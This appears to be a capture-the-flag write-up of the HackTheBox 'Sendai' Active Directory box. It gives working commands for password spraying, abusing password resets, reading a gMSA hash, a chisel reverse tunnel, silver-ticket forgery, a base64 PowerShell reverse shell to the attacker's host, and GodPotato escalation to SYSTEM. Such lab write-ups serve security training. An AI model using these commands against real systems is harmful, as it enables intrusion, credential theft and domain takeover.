---
date: '2026-01-11T00:33:12+02:00'
title: 'Sendai'
categories: [Writeup, HackTheBox]
tags: [windows, active directory, silver ticket]
---

## Initial recon

After performing nmap scan we can see some default windows port opened:
```bash
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-01-10 23:04:07Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sendai.vl
| Issuer: commonName=sendai-DC-CA/domainComponent=sendai
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-18T12:30:05
| Not valid after:  2026-08-18T12:30:05
--------------- SNIP -----------------
```

Netexec shows that guest access is allowed
```console
nxc smb sendai.vl -u 'guest' -p ''
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.66   445    DC               [+] sendai.vl\guest:
```

While enumerating shares we can see 3 different shares with read access
```bash
nxc smb sendai.vl -u 'guest' -p '' --shares
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.66   445    DC               [+] sendai.vl\guest:
SMB         10.129.234.66   445    DC               [*] Enumerated shares
SMB         10.129.234.66   445    DC               Share           Permissions     Remark
SMB         10.129.234.66   445    DC               -----           -----------     ------
SMB         10.129.234.66   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.66   445    DC               C$                              Default share
SMB         10.129.234.66   445    DC               config
SMB         10.129.234.66   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.66   445    DC               NETLOGON                        Logon server share
SMB         10.129.234.66   445    DC               sendai          READ            company share
SMB         10.129.234.66   445    DC               SYSVOL                          Logon server share
SMB         10.129.234.66   445    DC               Users           READ
```

With the nxc spider_plus module after enumerating shares we can find a few interesting files, like `incident.txt` and guidelines.txt

```json
"sendai": {
    "incident.txt": {
      "atime_epoch": "2023-07-18 12:34:15",
      "ctime_epoch": "2023-07-18 12:30:59",
      "mtime_epoch": "2023-07-18 12:34:15",
      "size": "1.34 KB"
    },
    "it/Bginfo64.exe": {
      "atime_epoch": "2023-07-18 08:16:43",
      "ctime_epoch": "2023-07-18 08:16:42",
      "mtime_epoch": "2023-07-18 08:16:46",
      "size": "2.65 MB"
    },
    "it/PsExec64.exe": {
      "atime_epoch": "2023-07-18 08:16:38",
      "ctime_epoch": "2023-07-18 08:16:37",
      "mtime_epoch": "2023-07-18 08:16:46",
      "size": "813.94 KB"
    },
    "security/guidelines.txt": {
      "atime_epoch": "2023-07-18 08:18:33",
      "ctime_epoch": "2023-07-18 08:17:33",
      "mtime_epoch": "2023-07-18 08:18:33",
      "size": "4.43 KB"
    }
```

incident.txt file tells us that some accounts have weak passwords and they must be changed:

> Recently, we conducted a thorough penetration test, which revealed that a significant number of user accounts have weak and insecure passwords.

`transfer` folder on `sendai` smb share contains multiple usernames which we should test for the weak password.
```bash
smb: \transfer\> ls
  .                                   D        0  Tue Jul 11 08:00:20 2023
  ..                                  D        0  Tue Jul 18 12:31:04 2023
  anthony.smith                       D        0  Tue Jul 11 07:59:50 2023
  clifford.davey                      D        0  Tue Jul 11 08:00:06 2023
  elliot.yates                        D        0  Tue Jul 11 07:59:26 2023
  lisa.williams                       D        0  Tue Jul 11 07:59:34 2023
  susan.harper                        D        0  Tue Jul 11 07:59:39 2023
  temp                                D        0  Tue Jul 11 08:00:16 2023
  thomas.powell                       D        0  Tue Jul 11 07:59:45 2023

                7019007 blocks of size 4096. 1165385 blocks available
smb: \transfer\>
```

Password spraying with empty password shows us 2 accounts whose status is `STATUS_PASSWORD_MUST_CHANGE`:
```bash
nxc smb sendai.vl -u users -p '' --continue-on-success
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.66   445    DC               [-] sendai.vl\anthony.smith: STATUS_LOGON_FAILURE
SMB         10.129.234.66   445    DC               [-] sendai.vl\clifford.davey: STATUS_LOGON_FAILURE
SMB         10.129.234.66   445    DC               [-] sendai.vl\elliot.yates: STATUS_PASSWORD_MUST_CHANGE
SMB         10.129.234.66   445    DC               [-] sendai.vl\lisa.williams: STATUS_LOGON_FAILURE
SMB         10.129.234.66   445    DC               [-] sendai.vl\susan.harper: STATUS_LOGON_FAILURE
SMB         10.129.234.66   445    DC               [+] sendai.vl\temp:
SMB         10.129.234.66   445    DC               [-] sendai.vl\thomas.powell: STATUS_PASSWORD_MUST_CHANGE
```

Using `smbpasswd.py` it is possible to change the password and enable the account
```bash
python3 /usr/share/doc/python3-impacket/examples/smbpasswd.py elliot.yates:''@sendai.vl -newpass 'P@ssw0rd123'
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies

===============================================================================
  Warning: This functionality will be deprecated in the next Impacket version
===============================================================================

Current SMB password:
[!] Password is expired, trying to bind with a null session.
[*] Password was changed successfully.
```
```bash
nxc smb sendai.vl -u elliot.yates -p 'P@ssw0rd123'
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.66   445    DC               [+] sendai.vl\elliot.yates:P@ssw0rd123
```
## Credentialed access

Using bloodhound python ingester now we can collect the data:
```bash
bloodhound-ce-python -d sendai.vl -u thomas.powell -p 'P@ssw0rd123' -c all --zip -dc dc.sendai.vl -ns 10.129.234.66
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: sendai.vl
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.sendai.vl
INFO: Testing resolved hostname connectivity dead:beef::9a36:70a4:d71e:cec1
INFO: Trying LDAP connection to dead:beef::9a36:70a4:d71e:cec1
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.sendai.vl
INFO: Testing resolved hostname connectivity dead:beef::9a36:70a4:d71e:cec1
INFO: Trying LDAP connection to dead:beef::9a36:70a4:d71e:cec1
INFO: Found 27 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 5 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.sendai.vl
INFO: Done in 00M 01S
INFO: Compressing output into 20260110172730_bloodhound.zip
```

Bloodhound shows that `thomas.powell` user has `GenericAll` rights over `ADMSVC` group, who can read gmsa password of `MGTSVC$` user.

Firstly using bloodyAD it is possible to add `thomas.powell` user to the `ADMSVC` group:
```bash
bloodyAD --host 10.129.234.66 -d sendai.vl -u thomas.powell -p 'P@ssw0rd123' add groupMember 'ADMSVC' thomas.powell
[+] thomas.powell added to ADMSVC
```

And then using nxc get ntlm hash of `mgtsvc$` user:
```bash
nxc ldap sendai.vl -u thomas.powell -p 'P@ssw0rd123' --gmsa
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)
LDAPS       10.129.234.66   636    DC               [+] sendai.vl\thomas.powell:P@ssw0rd123
LDAPS       10.129.234.66   636    DC               [*] Getting GMSA Passwords
LDAPS       10.129.234.66   636    DC               Account: mgtsvc$              NTLM: 2579ff83767013c18bbec6e84ffea6f9
```
`mgtsvc$` user is a member of `Remote management group` and we get winrm shell on the box and get user flag

```bash
*Evil-WinRM* PS C:\> cat user.txt
fff335936142d21a6fa**********
```
## Privilege Escalation
During the initial access it was also possible to `.sqlconfig` file from `config` share as it was unaccessible with guest user.
It contained the following string:

>Server=dc.sendai.vl,1433;Database=prod;User Id=sqlsvc;Password=SurenessBlob85;

Because mssql was not accessible at first - we could not use it, but now we have access to it.

Using chisel we can pivot and forward the port to our machine.

Victim machine:
```console
./chisel.exe client 10.10.14.202:8000 R:1433:10.129.234.66:1433
```

Attackers machine:
```console
./chisel server -p 8000 --reverse
```

After pivoting and logging in as sqlsvc user we can see that we are running as guest and do not have any special permissions:
```bash
nxc mssql localhost -u sqlsvc -p 'SurenessBlob85'
MSSQL       127.0.0.1       1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl) (EncryptionReq:False)
MSSQL       127.0.0.1       1433   DC               [+] sendai.vl\sqlsvc:SurenessBlob85
```

However we can do silver ticket attack. For the attack we need to collect the following data:

- DOMAIN_SID
- sqlsvc ntlm hash
- sqlsvc spn
  
Luckily bloodhound has all of the data.

Using ticketer we can forge administrators tgt ticket. It works because the "Service Ticket" is encrypted using the password hash of the service account running MSSQL. If you steal that hash, you can become anyone you want (e.g., the Domain Admin) in the eyes of that specific SQL Server.

```bash
ticketer.py -nthash 58655C0B90B2492F84FB46FA78C2D96A -domain-sid S-1-5-21-3085872742-570972823-736764132 -domain sendai.vl -spn MSSQL/dc.sendai.
vl:1433 Administrator
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for sendai.vl/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```
With this TGT ticket we were able to authenticate to mssql as Administrator on mssql server and as sqlsvc on the machine itself

```console
KRB5CCNAME=Administrator.ccache nxc mssql localhost --use-kcache -x 'whoami'
MSSQL       localhost       1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl) (EncryptionReq:False)
MSSQL       localhost       1433   DC               [+] sendai.vl\Administrator from ccache (Pwn3d!)
MSSQL       localhost       1433   DC               [+] Executed command via mssqlexec
MSSQL       localhost       1433   DC               sendai\sqlsvc
```

Using nxc -x flag it was possible to get a reverse shell on the box as sqlsvc:

```console
nxc mssql localhost --use-kcache -x 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjA
GsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgAwADIAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB
0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAc
gBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHc
ALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkA
GIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwA
kAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAY
gB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHI
AZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9A
DsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
MSSQL       localhost       1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl) (EncryptionReq:False)
MSSQL       localhost       1433   DC               [+] sendai.vl\Administrator from ccache (Pwn3d!)
[19:23:24] ERROR    Error when attempting to execute command via xp_cmdshell: timed out                                                mssqlexec.py:30
[19:23:29] ERROR    [OPSEC] Error when attempting to restore option 'xp_cmdshell': timed out                                           mssqlexec.py:47
[19:23:34] ERROR    [OPSEC] Error when attempting to restore option 'advanced options': timed out                                      mssqlexec.py:47
MSSQL       localhost       1433   DC               [+] Executed command via mssqlexec
```

```console
PS C:\Windows\system32> whoami /all

USER INFORMATION
----------------

User Name     SID
============= ============================================
sendai\sqlsvc S-1-5-21-3085872742-570972823-736764132-1104


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                                             Attributes
========================================== ================ =============================================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                                    Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group
NT SERVICE\MSSQL$SQLEXPRESS                Well-known group S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133 Enabled by default, Enabled group, Group owner
LOCAL                                      Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                                        Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

sqlsvc had `SeImpersonatePrivilege` privilege which could be abused using [GodPotato](https://github.com/BeichenDream/GodPotato) 
```console
PS C:\Users\Public\Documents> ./GodPotato-NET4.exe -cmd "cmd /c whoami"
[*] CombaseModule: 0x140711398866944
[*] DispatchTable: 0x140711401453896
[*] UseProtseqFunction: 0x140711400747200
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\f2accf4a-6d38-420f-a4b2-4f9977d68a2d\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000e802-0ce0-ffff-def5-caa935e5aa3b
[*] DCOM obj OXID: 0x26dabb389a5b812
[*] DCOM obj OID: 0x6fc6db86efa95049
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 940 Token:0x776  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 2880
nt authority\system
```

So that was the box and the root flag:
```console
PS C:\Users\Administrator\Desktop> type root.txt
1bc134a7b4ae19fcc07*********
PS C:\Users\Administrator\Desktop> whoami
nt authority\system
PS C:\Users\Administrator\Desktop>
```
